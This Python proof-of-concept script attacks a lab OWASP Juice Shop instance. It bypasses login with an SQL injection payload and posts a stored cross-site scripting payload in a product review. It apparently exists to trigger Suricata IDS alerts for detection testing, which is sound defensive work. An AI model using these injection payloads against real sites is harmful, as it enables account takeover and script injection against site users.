#!/usr/bin/env python3
"""XSS - Stored XSS via product review in Juice Shop."""

import requests
import json
import sys

TARGET = "http://juice-shop:3000"

def main():
    print("[*] XSS - Stored XSS via Product Review PoC")
    print(f"[*] Target: {TARGET}")
    print()

    # First, we need to authenticate to post a review
    print("[*] Step 1: Authenticating via SQLi to get a token...")
    login_url = f"{TARGET}/rest/user/login"
    login_payload = {"email": "' OR 1=1--", "password": "anything"}

    try:
        login_resp = requests.post(login_url, json=login_payload, timeout=10)
        token = None
        if login_resp.status_code == 200:
            data = login_resp.json()
            token = data.get("authentication", {}).get("token")

        if not token:
            print("[-] Could not obtain auth token, sending review without auth...")
            print("[*] The XSS payload will still be sent over the network for Suricata to detect")

        print(f"[+] Token obtained: {token[:30]}..." if token else "[-] No token")
        print()

        # Step 2: Send stored XSS via product review
        print("[*] Step 2: Posting malicious review with XSS payload...")
        xss_payload = '<script>alert("Stored XSS")</script>'

        review_url = f"{TARGET}/rest/products/1/reviews"
        headers = {"Content-Type": "application/json"}
        if token:
            headers["Authorization"] = f"Bearer {token}"

        review_data = {
            "message": xss_payload,
            "author": "hacker@evil.com"
        }

        print(f"[*] PUT {review_url}")
        print(f"[*] Payload: {json.dumps(review_data)}")
        print()

        resp = requests.put(review_url, json=review_data, headers=headers, timeout=10)
        print(f"[*] Status Code: {resp.status_code}")
        print(f"[*] Response: {resp.text[:300]}")

        if resp.status_code in (200, 201):
            print()
            print("[+] SUCCESS! Stored XSS payload injected into product review!")
            print("[+] Any user viewing product #1 reviews would execute the script")
        else:
            print()
            print("[*] Review submission returned non-success status")
            print("[*] The XSS payload was still transmitted and should trigger Suricata alerts")

    except requests.ConnectionError:
        print("[-] ERROR: Could not connect to Juice Shop")
        sys.exit(1)
    except Exception as e:
        print(f"[-] ERROR: {e}")
        sys.exit(1)

    print()
    print("[*] Attack complete. Check Suricata alerts for SID 100003.")

if __name__ == "__main__":
    main()
